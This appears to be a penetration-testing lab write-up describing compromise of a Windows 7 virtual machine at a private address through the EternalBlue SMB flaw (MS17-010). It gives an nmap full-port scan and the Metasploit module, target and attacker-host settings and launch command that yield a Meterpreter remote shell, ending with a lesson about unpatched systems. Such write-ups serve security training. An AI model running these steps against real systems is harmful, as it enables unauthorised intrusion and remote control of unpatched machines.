## Windows 7 Target — SMB Exploitation via EternalBlue

**Target IP:** `192.168.88.130`  
**Objective:** Identify vulnerabilities and gain access through remote exploitation.

---

### 🛍️ Initial Reconnaissance

To begin, I conducted an aggressive Nmap scan across all 65,535 TCP ports using service detection, OS fingerprinting, and version enumeration:

```bash
nmap -T4 -p- -A 192.168.88.130
```

**Key Findings:**

- Host OS: *Windows 7 Ultimate SP1 (7601)*
- Open ports:
  - `135/tcp` - Microsoft Windows RPC
  - `139/tcp` - NetBIOS Session Service
  - `445/tcp` - Microsoft-DS (SMB)
  - `49152-49156/tcp` - Additional MSRPC endpoints
- SMB security misconfigurations:
  - Guest access allowed
  - Message signing: **disabled**

The machine appeared to be a VMware virtual host running Windows 7 — a red flag in itself, considering the known vulnerabilities in legacy SMB implementations.

---

### 🔎 Vulnerability Research

With port `445` open and SMB exposed, I investigated known vulnerabilities in Windows 7 SMB services. A quick search confirmed that the infamous **EternalBlue (MS17-010)** exploit was still relevant. The specific exploit module I referenced:  
🔗 [Exploit-DB #42315](https://www.exploit-db.com/exploits/42315)

---

### 🎯 Exploitation with Metasploit

I launched Metasploit and searched for EternalBlue-related modules. Upon finding a matching exploit, I proceeded with the following steps:

1. **Selected the module**:  
   `exploit/windows/smb/ms17_010_eternalblue`

2. **Configured target settings**:
   ```bash
   set RHOSTS 192.168.88.130
   set LHOST <attacker IP>
   ```

3. **Verified vulnerability** using the auxiliary scanner and the module’s internal check:
   - Target confirmed to be vulnerable.

4. **Finalized options** and launched the exploit:
   ```bash
   exploit
   ```

5. **Result**: Successful compromise — a Meterpreter session was established, granting remote shell access.

---

### 💡 Takeaways

This engagement served as a practical demonstration of how unpatched systems — particularly those running outdated operating systems — remain dangerously exposed to well-documented exploits like EternalBlue. Even years later, these vulnerabilities continue to be low-hanging fruit in real-world pentesting scenarios.
